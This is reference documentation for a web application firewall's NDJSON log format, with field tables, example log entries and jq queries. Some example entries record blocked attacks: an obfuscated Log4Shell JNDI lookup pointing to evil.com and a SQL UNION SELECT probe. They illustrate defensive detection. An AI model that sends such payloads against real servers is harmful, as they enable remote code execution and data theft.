# Log Format Reference

Both the Node.js and PHP versions write logs in **NDJSON** (Newline Delimited JSON) format — one JSON object per line. This makes logs easy to process with `jq`, `grep`, `awk`, or any streaming JSON parser.

Default log path: `./logs/waf.log` (Node.js) / `php/logs/waf.log` (PHP).

---

## All fields

| Field | Type | Present | Description |
|-------|------|---------|-------------|
| `timestamp` | string | Always | ISO 8601 UTC timestamp of the request |
| `requestId` | string | Always (debug) / blocked | 16-char hex random ID for correlating log entries with response headers |
| `ip` | string | Always | Client IP address (from socket or `X-Forwarded-For` if `trustedProxies` is set) |
| `method` | string | Always | HTTP method (`GET`, `POST`, etc.) |
| `path` | string | Always | URL path (without query string) |
| `result` | string | Always | `"blocked"` or `"passed"` (passed only in debug mode) |
| `rule` | string | Blocked | Rule ID that matched (e.g., `sql-union-select`, `log4shell-jndi`) |
| `matched` | string | Blocked | The portion of the input that matched the rule regex (truncated to 120 chars) |
| `decoded` | string | Blocked (debug) | The value after `deepDecode()` normalization — shown only when it differs from `matched` |
| `source` | string | Blocked | Where the match was found (see source values below) |
| `severity` | string | Blocked | `critical`, `high`, or `medium` |
| `userAgent` | string | Blocked | Value of the `User-Agent` request header |
| `processingTimeMs` | number | Debug mode | Wall-clock time from request start to WAF decision, in milliseconds |
| `checksRun` | number | Debug/passed | Number of middleware stages that ran before the request was passed |

---

## Severity levels

| Severity | Meaning |
|----------|---------|
| `critical` | Immediate, unambiguous attack. Blocks RCE, authentication bypass, data exfiltration. Should always be blocked. |
| `high` | Likely attack with low false-positive rate. Cover techniques used in reconnaissance or that enable further exploitation. |
| `medium` | Common attack pattern that may occasionally match legitimate input. Review in `log-only` mode before enforcing. |

---

## Source values

| Source | Example | Meaning |
|--------|---------|---------|
| `query` | `query` | A query string parameter (`req.query`) |
| `body` | `body` | A request body field (`req.body`) |
| `path` | `path` | The URL path string |
| `cookie:<name>` | `cookie:session` | A cookie with the given name |
| `user-agent` | `user-agent` | The `User-Agent` header |
| `header:<name>` | `header:x-api-version` | An arbitrary header (Log4Shell, Shellshock, SSRF scans) |
| `query:<key>` | `query:url` | A specific query key (SSRF, open redirect) |
| `body:<key>` | `body:redirect` | A specific body key (SSRF, open redirect) |
| `query-raw` | `query-raw` | The raw query string before qs parsing (NoSQL bracket notation) |
| `body-raw` | `body-raw` | The raw body string (deserialization binary payload) |

---

## Example: blocked request

```json
{
  "timestamp": "2026-03-30T15:30:00Z",
  "requestId": "f47ac10b58cc1122",
  "ip": "203.0.113.42",
  "method": "GET",
  "path": "/search",
  "result": "blocked",
  "rule": "sql-union-select",
  "matched": "UNION SELECT",
  "source": "query",
  "severity": "critical",
  "userAgent": "sqlmap/1.7"
}
```

---

## Example: passed request (debug mode only)

```json
{
  "timestamp": "2026-03-30T15:30:01Z",
  "requestId": "a8b4c2d1e9f03847",
  "ip": "127.0.0.1",
  "method": "GET",
  "path": "/",
  "result": "passed",
  "processingTimeMs": 0.42,
  "checksRun": 16
}
```

---

## Example: Log4Shell in a header (debug fields shown)

```json
{
  "timestamp": "2026-03-30T16:00:00Z",
  "requestId": "c3d4e5f6a7b8c9d0",
  "ip": "45.33.32.156",
  "method": "GET",
  "path": "/api/users",
  "result": "blocked",
  "rule": "log4shell-obfuscated-lower",
  "matched": "${${lower:j}ndi:ldap://evil.com/a}",
  "decoded": "${${lower:j}ndi:ldap://evil.com/a}",
  "source": "header:x-api-version",
  "severity": "critical",
  "userAgent": "Mozilla/5.0",
  "processingTimeMs": 0.91
}
```

---

## Querying logs with jq

```bash
# All blocked requests with critical severity
cat logs/waf.log | jq 'select(.result == "blocked" and .severity == "critical")'

# Top 10 attacking IPs
cat logs/waf.log | jq -r '.ip' | sort | uniq -c | sort -rn | head -10

# All unique rules that fired today
cat logs/waf.log | jq -r 'select(.timestamp >= "2026-03-30") | .rule // empty' | sort -u

# Requests from a specific IP
cat logs/waf.log | jq 'select(.ip == "203.0.113.42")'

# Rules that fired via a cookie source
cat logs/waf.log | jq 'select(.source | startswith("cookie:"))'

# Log4Shell attempts in the last hour
cat logs/waf.log | jq 'select(.rule | startswith("log4shell")) | select(.timestamp >= "2026-03-30T15:00:00Z")'

# Average processing time (debug mode)
cat logs/waf.log | jq -s '[.[].processingTimeMs | select(. != null)] | add / length'

# Export as CSV
cat logs/waf.log | jq -r '[.timestamp, .ip, .rule // "", .path, .severity // ""] | @csv' > report.csv
```

---

## Using waf-log CLI

The `waf-log` CLI reads the same NDJSON format and adds filtering, color output, and stats:

```bash
npx waf-log --stats
npx waf-log --blocked --rule sql
npx waf-log --ip 203.0.113.42
npx waf-log --since 2026-03-30T00:00:00Z --json | jq .
```

See [nodejs/cli.md](nodejs/cli.md) for the full CLI reference.
